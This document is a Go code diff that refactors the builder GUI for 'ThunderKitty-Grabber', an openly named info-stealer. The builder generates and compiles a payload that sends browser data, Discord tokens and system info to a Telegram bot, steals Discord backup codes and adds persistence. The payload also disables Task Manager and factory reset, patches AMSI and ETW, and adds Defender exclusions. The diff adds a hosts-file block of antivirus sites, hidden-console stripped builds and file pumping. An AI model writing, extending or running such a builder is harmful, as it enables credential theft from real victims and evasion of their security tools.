@@ -4,18 +4,39 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
-	"runtime"
 	"strconv"
+	"text/template"
 
 	"fyne.io/fyne/v2"
-
 	"fyne.io/fyne/v2/app"
 	"fyne.io/fyne/v2/container"
 	"fyne.io/fyne/v2/widget"
 )
 
-func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse, patchPowerShell, enablePersistence, stealBackupCodes, setWallpaper, enableTokenGrabber bool, dmMessage string) {
-	content := fmt.Sprintf(`
+type Config struct {
+	TeleBotToken        string
+	TeleChatID          string
+	EnableAntiDebug     bool
+	EnableFakeError     bool
+	EnableBrowsers      bool
+	HideConsole         bool
+	DisableFactoryReset bool
+	DisableTaskManager  bool
+	BlockHostsFile      bool
+	OpenSiteURL         string
+	SpeakTTSMessage     string
+	SwapMouse           bool
+	PatchPowerShell     bool
+	EnablePersistence   bool
+	StealBackupCodes    bool
+	SetWallpaper        bool
+	EnableTokenGrabber  bool
+	DMMessage           string
+	FilePumperSize      string
+}
+
+func buildExecutable(cfg Config) {
+	const templateContent = `
 package main
 
 import (
@@ -26,11 +47,11 @@ import (
 	"ThunderKitty-Grabber/utils/browsers"
 	"ThunderKitty-Grabber/utils/tokengrabber"
 	"ThunderKitty-Grabber/utils/criticalprocess"
-	"ThunderKitty-Grabber/utils/hideconsole"
 	"ThunderKitty-Grabber/utils/backupcodes"
 	"ThunderKitty-Grabber/utils/disablefactoryreset"
 	"ThunderKitty-Grabber/utils/taskmanager"
 	"ThunderKitty-Grabber/utils/persistence"
+	"ThunderKitty-Grabber/utils/hosts"
 	"ThunderKitty-Grabber/utils/exclude"
 	"ThunderKitty-Grabber/utils/defender"
 	"ThunderKitty-Grabber/utils/powershellpatcher"
@@ -40,22 +61,17 @@ import (
 )
 
 const (
-	telebottoken = "%s"
-	telechatid   = "%s"
+	TelegramBotToken = "{{.TeleBotToken}}"
+	TelegramChatId   = "{{.TeleChatID}}"
 )
 
 func main() {
-	if %t {
-		go HideConsoleWindow.HideWindow()
-	} else {
-		fmt.Println("Console window not hidden")
-	}
- 	if %t {
+ 	if {{.EnableAntiDebug}} {
 		go AntiDebugVMAnalysis.ThunderKitty()
 	} else {
 		fmt.Println("Anti-debugging and VM analysis not enabled")
 	}
-	if %t {
+	if {{.EnableFakeError}} {
 		go FakeError.Show()
 	} else {
 		fmt.Println("Fake error not enabled")
@@ -66,77 +82,89 @@ func main() {
 	go Mutex.Create()
 	go CriticalProcess.Set()
 
-	go SysInfo.Fetch()
+	go SysInfo.Fetch(TelegramBotToken, TelegramChatId)
 
-	if %t {
-		go browsers.ThunderKittyGrab(telebottoken, telechatid)
+	if {{.EnableBrowsers}} {
+		go browsers.ThunderKittyGrab(TelegramBotToken, TelegramChatId)
 	} else {
 		fmt.Println("Browser info grabbing not enabled")
 	}
 	
-	if %t {
-		TokenGrabber.Run(telebottoken, telechatid, "%s")
+	if {{.EnableTokenGrabber}} {
+		TokenGrabber.Run(TelegramBotToken, TelegramChatId, "{{.DMMessage}}")
 	} else {
 		fmt.Println("Discord token grabbing not enabled")
 	}
 
-	if %t {
+	if {{.StealBackupCodes}} {
 		go BackupCodes.Search()
 	} else {
 		fmt.Println("Discord backup code recovery disabled")
 	}
 
-	if %t {
+	if {{.DisableFactoryReset}} {
 		go FactoryReset.Disable()
 	} else {
 		fmt.Println("Factory reset not disabled")
 	}
 
-	if %t {
+	if {{.DisableTaskManager}} {
 		go TaskManager.Disable()
 	} else {
 		fmt.Println("Task manager not disabled")
 	}
 
-	if %t {
-		Persistence.Create()
+	if {{.EnablePersistence}} {
+		go Persistence.Create()
 	} else {
 		fmt.Println("Persistence not enabled")
 	}
+
+	if {{.BlockHostsFile}} {
+		go Hosts.Infect()
+	} else {
+		fmt.Println("Block hosts file not enabled")
+	}
 	
-	url := "%s"
+	url := "{{.OpenSiteURL}}"
 	if url != "" {
 		exec.Command("cmd.exe", "/c", "start", url).Run()
 	} else {
 		fmt.Println("Open website not enabled")
 	}
 	
-	ttsMessage := "%s"
+	ttsMessage := "{{.SpeakTTSMessage}}"
 	if ttsMessage != "" {
 		exec.Command("PowerShell", "-Command", "(New-Object -ComObject SAPI.SpVoice).Speak(\"" + ttsMessage + "\")").Run()
 	} else {
 		fmt.Println("TTS not enabled")
 	}
 
-	if %t {
+	if {{.SwapMouse}} {
 		exec.Command("cmd", "/c", "rundll32.exe", "user32.dll,SwapMouseButton").Run()
 	} else {
 		fmt.Println("Swap mouse not enabled")
 	}
 
-	if %t {
+	if {{.PatchPowerShell}} {
 		go PowerShellPatcher.Patch()
 	} else {
 		fmt.Println("PowerShell patcher not enabled")
 	}
 
-	if %t {
+	if {{.SetWallpaper}} {
 		WallpaperChanger.DownloadAndSetWallpaper()
 	} else {
 		fmt.Println("Wallpaper changer not enabled")
 	}
 }
-`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, enableTokenGrabber, dmMessage, stealBackupCodes, disableFactoryReset, disableTaskManager, enablePersistence, openSiteURL, speakTTSMessage, swapMouse, patchPowerShell, setWallpaper)
+`
+
+	tmpl, err := template.New("main").Parse(templateContent)
+	if err != nil {
+		fmt.Println("Error parsing template:", err)
+		return
+	}
 
 	file, err := os.Create("main.go")
 	if err != nil {
@@ -145,16 +173,19 @@ func main() {
 	}
 	defer file.Close()
 
-	_, err = file.WriteString(content)
+	err = tmpl.Execute(file, cfg)
 	if err != nil {
-		fmt.Println("Error writing to main.go:", err)
+		fmt.Println("Error executing template:", err)
 		return
 	}
 
-	cmd := exec.Command("go", "build", "main.go")
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/C", "go build main.go")
+	ldflags := "-s -w"
+	if cfg.HideConsole {
+		ldflags += " -H=windowsgui"
 	}
+	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "main.go")
+	fmt.Println(cmd)
+
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 
@@ -209,6 +240,7 @@ func main() {
 	hideConsole := widget.NewCheck("Hide Console Window", nil)
 	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
 	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
+	blockHostsFile := widget.NewCheck("Block AV Sites", nil)
 	patchPowershell := widget.NewCheck("Patch PowerShell (AMSI & ETW)", nil)
 	enablePersistence := widget.NewCheck("Enable Persistence", nil)
 
@@ -233,17 +265,33 @@ func main() {
 		os.Remove("main.exe")
 
 		// Build the new one
-		telebottoken := telegramBotTokenEntry.Text
-		telechatid := telegramChatIdEntry.Text
-		openSiteURL := openSiteEntry.Text
-		speakTTSMessage := speakTTSEntry.Text
-		dmMessage := sendDMMessage.Text
-		filePumperSize := filePumperEntry.Text
-		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked, patchPowershell.Checked, enablePersistence.Checked, stealBackupCodes.Checked, setWallpaper.Checked, enableTokenGrabber.Checked, dmMessage)
+		cfg := Config{
+			TeleBotToken:        telegramBotTokenEntry.Text,
+			TeleChatID:          telegramChatIdEntry.Text,
+			EnableAntiDebug:     enableAntiDebug.Checked,
+			EnableFakeError:     enableFakeError.Checked,
+			EnableBrowsers:      enableBrowsers.Checked,
+			HideConsole:         hideConsole.Checked,
+			DisableFactoryReset: disableFactoryReset.Checked,
+			DisableTaskManager:  disableTaskManager.Checked,
+			BlockHostsFile:      blockHostsFile.Checked,
+			OpenSiteURL:         openSiteEntry.Text,
+			SpeakTTSMessage:     speakTTSEntry.Text,
+			SwapMouse:           enableSwapMouse.Checked,
+			PatchPowerShell:     patchPowershell.Checked,
+			EnablePersistence:   enablePersistence.Checked,
+			StealBackupCodes:    stealBackupCodes.Checked,
+			SetWallpaper:        setWallpaper.Checked,
+			EnableTokenGrabber:  enableTokenGrabber.Checked,
+			DMMessage:           sendDMMessage.Text,
+			FilePumperSize:      filePumperEntry.Text,
+		}
+
+		buildExecutable(cfg)
 
 		// Pumper
-		if filePumperSize != "" {
-			pumpSize, err := strconv.Atoi(filePumperSize)
+		if filePumperEntry.Text != "" {
+			pumpSize, err := strconv.Atoi(filePumperEntry.Text)
 			if err != nil {
 				panic(err)
 			}
@@ -265,6 +313,7 @@ func main() {
 		disableFactoryReset,
 		disableTaskManager,
 		patchPowershell,
+		blockHostsFile,
 		enablePersistence,
 		buildButton,
 	)
